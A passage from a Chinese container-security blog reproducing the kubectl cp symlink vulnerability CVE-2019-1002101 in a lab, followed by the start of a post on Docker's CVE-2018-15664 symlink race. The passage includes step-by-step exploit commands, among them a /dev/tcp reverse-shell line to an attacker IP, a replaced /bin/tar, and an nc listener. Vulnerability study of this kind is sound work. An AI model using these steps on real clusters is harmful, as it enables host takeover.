<p>Kubernetes 1.14.0</p>
<p>Redhat Openshift_Container_Platform 3.11</p>
<p>1.12.0 &lt;&#x3D; Kubernetes &lt; 1.12.7</p>
<p>Redhat Openshift_Container_Platform 3.9</p>
<p>1.13.0 &lt;&#x3D; Kubernetes &lt; 1.13.5</p>
<p>1.11.0 &lt;&#x3D; Kubernetes &lt; 1.11.9</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>Kubernetes 1.11.1</p>
<h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><ol>
<li>使用Metarget创建单节点k8s集群</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./metarget cnv install cve-2019-1002101 --domestic</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231009101802523.png" alt="image-20231009101802523"></p>
<p>可以看到单节点集群环境安装成功（需要使用<code>--domestic</code>安装单节点k8s集群）</p>
<ol start="2">
<li>创建一个Pod并运行Nginx容器，查看运行状态</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl run nginx --image=nginx</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231009103109364.png" alt="image-20231009103109364"></p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231009103202133.png" alt="image-20231009103202133"></p>
<h4 id="brompwnie的做法"><a href="#brompwnie的做法" class="headerlink" title="brompwnie的做法"></a>brompwnie的做法</h4><ol>
<li>首先从github中获取我们需要的三个文件</li>
</ol>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231009141000443.png" alt="image-20231009141000443"></p>
<ol start="2">
<li>使用kubectl cp将文件传输到容器中（这样传文件比较方便）</li>
</ol>
<p>注意：createPwnTar.sh中需要修改反弹shell命令中的<code>x.x.x.x/端口</code>为攻击机的ip和端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl <span class="built_in">cp</span> /home/safedog/setupTar.sh nginx-64f497f8fd-wdsg2:.</span><br><span class="line">kubectl <span class="built_in">cp</span> /home/safedog/badbin nginx-64f497f8fd-wdsg2:.</span><br><span class="line">kubectl <span class="built_in">cp</span> /home/safedog/createPwnTar.sh nginx-64f497f8fd-wdsg2:.</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>赋予三个文件执行权限</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x badbin setupTar.sh createPwnTar.sh</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>依次执行createPwnTar.sh和setupTar.sh</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./createPwnTar.sh</span><br><span class="line">./setupTar.sh</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231009141521362.png" alt="image-20231009141521362"></p>
<ol start="5">
<li>攻击机远程监听，宿主机执行kubectl cp将恶意符号链接植入宿主机，之后只要在植入的路径打开终端便能够反弹shell</li>
</ol>
<p>宿主机执行<code>kubectl cp</code>命令</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231009142741919.png" alt="image-20231009142741919"></p>
<p>宿主机在路径下打开终端，攻击机获取反弹shell</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231009142847787.png" alt="image-20231009142847787"></p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231009142923329.png" alt="image-20231009142923329"></p>
<h4 id="h4ckm310n的做法"><a href="#h4ckm310n的做法" class="headerlink" title="h4ckm310n的做法"></a>h4ckm310n的做法</h4><ol>
<li>使用kubectl进入容器命令行，进行恶意tar包构造</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl <span class="built_in">exec</span> -it nginx-64f497f8fd-wdsg2 -- /bin/bash</span><br></pre></td></tr></table></figure>

<p>在当前目录下创建了一个名为 <code>badbin</code> 的符号链接，指向系统的 <code>/bin</code> 目录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /bin ./badbin</span><br></pre></td></tr></table></figure>

<p>这个步骤将 <code>/bin</code> 目录的符号链接<code>badbin</code>一起打包到了 <code>malicious.tar</code> 中。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cf malicious.tar ./badbin</span><br></pre></td></tr></table></figure>

<p>这个命令尝试删除当前目录下的 <code>./badbin</code> 目录。但由于 <code>./badbin</code> 是一个符号链接，删除操作不会影响到 <code>/bin</code> 目录，因为它只会删除链接而不会删除链接指向的目录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -f ./badbin</span><br></pre></td></tr></table></figure>

<p>这个命令在当前目录下创建了一个名为 <code>./badbin</code> 的新目录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> ./badbin</span><br></pre></td></tr></table></figure>

<p>这个命令使用 <code>echo</code> 将一段脚本写入 <code>./badbin/ls</code> 文件。这段脚本实际上是一个简单的反向 shell，它试图连接到 IP 地址 <code>172.27.5.11</code> 的 TCP 端口 <code>12345</code>，并将命令执行的结果发送到该连接。这是一个潜在的恶意操作，可以用于入侵和远程控制目标系统。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;#!/bin/bash\n/bin/bash -i &gt;&amp; /dev/tcp/172.27.5.11/12345 0&gt;&amp;1&#x27;</span> &gt; ./badbin/ls</span><br></pre></td></tr></table></figure>

<p>这个命令将 <code>./badbin/ls</code> 文件的执行权限设置为可执行。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x ./badbin/ls</span><br></pre></td></tr></table></figure>

<p>这个命令将新创建的 <code>./badbin/ls</code> 文件添加到之前创建的 <code>malicious.tar</code> 归档文件中。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -rf malicious.tar ./badbin/ls</span><br></pre></td></tr></table></figure>

<p>创建恶意test文件，内容如下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cat</span> /malicious.tar</span><br></pre></td></tr></table></figure>

<p>将其替换到&#x2F;bin&#x2F;tar中。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf /bin/tar</span><br><span class="line"><span class="built_in">cp</span> <span class="built_in">test</span> /bin/tar</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>攻击机远程监听，宿主机执行kubectl cp将恶意符号链接植入宿主机，并执行ls命令触发反弹shell</li>
</ol>
<p>kali攻击机进行监听</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 12345</span><br></pre></td></tr></table></figure>

<p>宿主机执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl <span class="built_in">cp</span>  nginx-64f497f8fd-wdsg2:<span class="built_in">test</span> /home/safedog</span><br></pre></td></tr></table></figure>

<p>宿主机执行<code>kubectl cp</code>成功后可以发现bin目录被携带下来</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231009140545804.png" alt="image-20231009140545804"></p>
<p>宿主机执行成功后执行ls命令，可以在攻击机上获取反弹的shell</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231009140316389.png" alt="image-20231009140316389"></p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231009140228230.png" alt="image-20231009140228230"></p>
<h2 id="总结思考检测方式"><a href="#总结思考检测方式" class="headerlink" title="总结思考检测方式"></a>总结思考检测方式</h2><ol>
<li>版本检测</li>
</ol>
<p>根据漏洞影响的版本信息进行检测</p>
<ol start="2">
<li>敏感目录&#x2F;bin&#x2F;tar</li>
</ol>
<p>监控异常指令修改&#x2F;bin&#x2F;tar目录导致漏洞利用</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>POC：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/brompwnie/CVE-2019-1002101-Helpers">https://github.com/brompwnie/CVE-2019-1002101-Helpers</a></p>
<p><a target="_blank" rel="noopener" href="https://h4ckm310n.com/?p=528">https://h4ckm310n.com/?p=528</a></p>
<p>漏洞通告：</p>
<p><a target="_blank" rel="noopener" href="https://discuss.kubernetes.io/t/announce-security-release-of-kubernetes-kubectl-potential-directory-traversal-releases-1-11-9-1-12-7-1-13-5-and-1-14-0-cve-2019-1002101/5712">https://discuss.kubernetes.io/t/announce-security-release-of-kubernetes-kubectl-potential-directory-traversal-releases-1-11-9-1-12-7-1-13-5-and-1-14-0-cve-2019-1002101/5712</a></p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-10-09</span><i class="fa fa-tag"></i><a class="tag" href="/tags/容器安全/" title="容器安全">容器安全 </a><span class="leancloud_visitors"></span><span>大约1138个字, 3分钟47秒读完</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/09/12/CVE-2018-15664%20%E5%88%A9%E7%94%A8%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">CVE-2018-15664 利用符号链接容器逃逸</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-Sally-blue.svg"></a></p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Docker &lt;&#x3D; 18.06.1-ce-rc2</p>
<h2 id="Docker-cp"><a href="#Docker-cp" class="headerlink" title="Docker cp"></a>Docker cp</h2><p>Docker cp命令能够将容器内的文件向宿主机复制，也能够实现宿主机文件向容器中复制。</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将容器中的文件复制到宿主机中</span></span><br><span class="line">docker cp container_id:file_path_in_container host_path</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20230912113020582.png"></p>
<h2 id="符号链接"><a href="#符号链接" class="headerlink" title="符号链接"></a>符号链接</h2><p>类似于Windows中的快捷方式。符号链接的操作是透明的：对符号链接文件进行读写的程序会表现得直接对目标文件进行操作。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将目标路径和指定的链接名或者路径进行绑定</span></span><br><span class="line"><span class="built_in">ln</span> -s targrt_path link_path</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20230912114240358.png" alt="image-20230912114240358"></p>
<h2 id="源码及利用原理"><a href="#源码及利用原理" class="headerlink" title="源码及利用原理"></a>源码及利用原理</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright 2012 The Go Authors. All rights reserved.</span></span><br><span class="line"><span class="comment">// Use of this source code is governed by a BSD-style</span></span><br><span class="line"><span class="comment">// license that can be found in the LICENSE.BSD file.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// This code is a modified version of path/filepath/symlink.go from the Go standard library.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> symlink</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;errors&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/docker/docker/pkg/system&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// FollowSymlinkInScope is a wrapper around evalSymlinksInScope that returns an</span></span><br><span class="line"><span class="comment">// absolute path. This function handles paths in a platform-agnostic manner.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">FollowSymlinkInScope</span><span class="params">(path, root <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	path, err := filepath.Abs(filepath.FromSlash(path))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	root, err = filepath.Abs(filepath.FromSlash(root))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> evalSymlinksInScope(path, root)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// evalSymlinksInScope will evaluate symlinks in `path` within a scope `root` and return</span></span><br><span class="line"><span class="comment">// a result guaranteed to be contained within the scope `root`, at the time of the call.</span></span><br><span class="line"><span class="comment">// Symlinks in `root` are not evaluated and left as-is.</span></span><br><span class="line"><span class="comment">// Errors encountered while attempting to evaluate symlinks in path will be returned.</span></span><br><span class="line"><span class="comment">// Non-existing paths are valid and do not constitute an error.</span></span><br><span class="line"><span class="comment">// `path` has to contain `root` as a prefix, or else an error will be returned.</span></span><br><span class="line"><span class="comment">// Trying to break out from `root` does not constitute an error.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Example:</span></span><br><span class="line"><span class="comment">//   If /foo/bar -&gt; /outside,</span></span><br><span class="line"><span class="comment">//   FollowSymlinkInScope(&quot;/foo/bar&quot;, &quot;/foo&quot;) == &quot;/foo/outside&quot; instead of &quot;/oustide&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// IMPORTANT: it is the caller&#x27;s responsibility to call evalSymlinksInScope *after* relevant symlinks</span></span><br><span class="line"><span class="comment">// are created and not to create subsequently, additional symlinks that could potentially make a</span></span><br><span class="line"><span class="comment">// previously-safe path, unsafe. Example: if /foo/bar does not exist, evalSymlinksInScope(&quot;/foo/bar&quot;, &quot;/foo&quot;)</span></span><br><span class="line"><span class="comment">// would return &quot;/foo/bar&quot;. If one makes /foo/bar a symlink to /baz subsequently, then &quot;/foo/bar&quot; should</span></span><br><span class="line"><span class="comment">// no longer be considered safely contained in &quot;/foo&quot;.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">evalSymlinksInScope</span><span class="params">(path, root <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	root = filepath.Clean(root)</span><br><span class="line">	<span class="keyword">if</span> path == root &#123;</span><br><span class="line">		<span class="keyword">return</span> path, <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> !strings.HasPrefix(path, root) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;evalSymlinksInScope: &quot;</span> + path + <span class="string">&quot; is not in &quot;</span> + root)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">const</span> maxIter = <span class="number">255</span></span><br><span class="line">	originalPath := path</span><br><span class="line">	<span class="comment">// given root of &quot;/a&quot; and path of &quot;/a/b/../../c&quot; we want path to be &quot;/b/../../c&quot;</span></span><br><span class="line">	path = path[<span class="built_in">len</span>(root):]</span><br><span class="line">	<span class="keyword">if</span> root == <span class="type">string</span>(filepath.Separator) &#123;</span><br><span class="line">		path = <span class="type">string</span>(filepath.Separator) + path</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> !strings.HasPrefix(path, <span class="type">string</span>(filepath.Separator)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;evalSymlinksInScope: &quot;</span> + path + <span class="string">&quot; is not in &quot;</span> + root)</span><br><span class="line">	&#125;</span><br><span class="line">	path = filepath.Clean(path)</span><br><span class="line">	<span class="comment">// consume path by taking each frontmost path element,</span></span><br><span class="line">	<span class="comment">// expanding it if it&#x27;s a symlink, and appending it to b</span></span><br><span class="line">	<span class="keyword">var</span> b bytes.Buffer</span><br><span class="line">	<span class="comment">// b here will always be considered to be the &quot;current absolute path inside</span></span><br><span class="line">	<span class="comment">// root&quot; when we append paths to it, we also append a slash and use</span></span><br><span class="line">	<span class="comment">// filepath.Clean after the loop to trim the trailing slash</span></span><br><span class="line">	<span class="keyword">for</span> n := <span class="number">0</span>; path != <span class="string">&quot;&quot;</span>; n++ &#123;</span><br><span class="line">		<span class="keyword">if</span> n &gt; maxIter &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;evalSymlinksInScope: too many links in &quot;</span> + originalPath)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// find next path component, p</span></span><br><span class="line">		i := strings.IndexRune(path, filepath.Separator)</span><br><span class="line">		<span class="keyword">var</span> p <span class="type">string</span></span><br><span class="line">		<span class="keyword">if</span> i == <span class="number">-1</span> &#123;</span><br><span class="line">			p, path = path, <span class="string">&quot;&quot;</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			p, path = path[:i], path[i+<span class="number">1</span>:]</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> p == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// this takes a b.String() like &quot;b/../&quot; and a p like &quot;c&quot; and turns it</span></span><br><span class="line">		<span class="comment">// into &quot;/b/../c&quot; which then gets filepath.Cleaned into &quot;/c&quot; and then</span></span><br><span class="line">		<span class="comment">// root gets prepended and we Clean again (to remove any trailing slash</span></span><br><span class="line">		<span class="comment">// if the first Clean gave us just &quot;/&quot;)</span></span><br><span class="line">		cleanP := filepath.Clean(<span class="type">string</span>(filepath.Separator) + b.String() + p)</span><br><span class="line">		<span class="keyword">if</span> cleanP == <span class="type">string</span>(filepath.Separator) &#123;</span><br><span class="line">			<span class="comment">// never Lstat &quot;/&quot; itself</span></span><br><span class="line">			b.Reset()</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line">		fullP := filepath.Clean(root + cleanP)</span><br><span class="line"></span><br><span class="line">		fi, err := os.Lstat(fullP)</span><br><span class="line">		<span class="keyword">if</span> os.IsNotExist(err) &#123;</span><br><span class="line">			<span class="comment">// if p does not exist, accept it</span></span><br><span class="line">			b.WriteString(p)</span><br><span class="line">			b.WriteRune(filepath.Separator)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> fi.Mode()&amp;os.ModeSymlink == <span class="number">0</span> &#123;</span><br><span class="line">			b.WriteString(p + <span class="type">string</span>(filepath.Separator))</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// it&#x27;s a symlink, put it at the front of path</span></span><br><span class="line">		dest, err := os.Readlink(fullP)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> system.IsAbs(dest) &#123;</span><br><span class="line">			b.Reset()</span><br><span class="line">		&#125;</span><br><span class="line">		path = dest + <span class="type">string</span>(filepath.Separator) + path</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// see note above on &quot;fullP := ...&quot; for why this is double-cleaned and</span></span><br><span class="line">	<span class="comment">// what&#x27;s happening here</span></span><br><span class="line">	<span class="keyword">return</span> filepath.Clean(root + filepath.Clean(<span class="type">string</span>(filepath.Separator)+b.String())), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// EvalSymlinks returns the path name after the evaluation of any symbolic</span></span><br><span class="line"><span class="comment">// links.</span></span><br><span class="line"><span class="comment">// If path is relative the result will be relative to the current directory,</span></span><br><span class="line"><span class="comment">// unless one of the components is an absolute symbolic link.</span></span><br><span class="line"><span class="comment">// This version has been updated to support long paths prepended with `\\?\`.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">EvalSymlinks</span><span class="params">(path <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> evalSymlinks(path)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Docker cp过程中FolllowSyslinkInScope方法会先检测路径合法存在，检测结束后evalSymlinkInScope方法对路径进行解析并执行后续文件复制操作。</p>
<p>整个复制过程不是一个原子操作，而<strong>路径检测</strong>和<strong>解析执行</strong>才分别是原子操作。在这个复制过程中如果攻击者在路径检测结束后将正常路径替换成一个恶意的符号链接，那么攻击者将能够对Docker cp的目的主机（可以是容器也可以是宿主机）任意路径的文件内容进行覆盖。</p>
<p>然而这里我也有个猜测，Docker cp相当于一个<strong>set-uid进程</strong>，于是它可以获得文件root权限进行文件内容覆盖。</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20230912134832774.png" alt="image-20230912134832774"></p>
<h2 id="漏洞场景和POC解读"><a href="#漏洞场景和POC解读" class="headerlink" title="漏洞场景和POC解读"></a>漏洞场景和POC解读</h2><h3 id="漏洞场景：受害者在从容器中复制文件到宿主机"><a href="#漏洞场景：受害者在从容器中复制文件到宿主机" class="headerlink" title="漏洞场景：受害者在从容器中复制文件到宿主机"></a>漏洞场景：受害者在从容器中复制文件到宿主机</h3><p>当漏洞触发时容器内的文件将被复制到宿主机中的任意一个目录（恶意符号链接所指定）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/zsh</span></span><br><span class="line"><span class="comment"># Copyright (C) 2018 Aleksa Sarai &lt;asarai@suse.de&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This program is free software: you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment"># it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment"># the Free Software Foundation, either version 3 of the License, or</span></span><br><span class="line"><span class="comment"># (at your option) any later version.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment"># but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment"># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment"># GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="comment"># along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span></span><br><span class="line"></span><br><span class="line">SYMSWAP_PATH=/totally_safe_path</span><br><span class="line">SYMSWAP_TARGET=/w00t_w00t_im_a_flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create our flag.</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;SUCCESS -- COPIED FROM THE HOST&quot;</span> | sudo <span class="built_in">tee</span> <span class="string">&quot;<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span><br><span class="line">sudo <span class="built_in">chmod</span> 000 <span class="string">&quot;<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Run and build the malicious 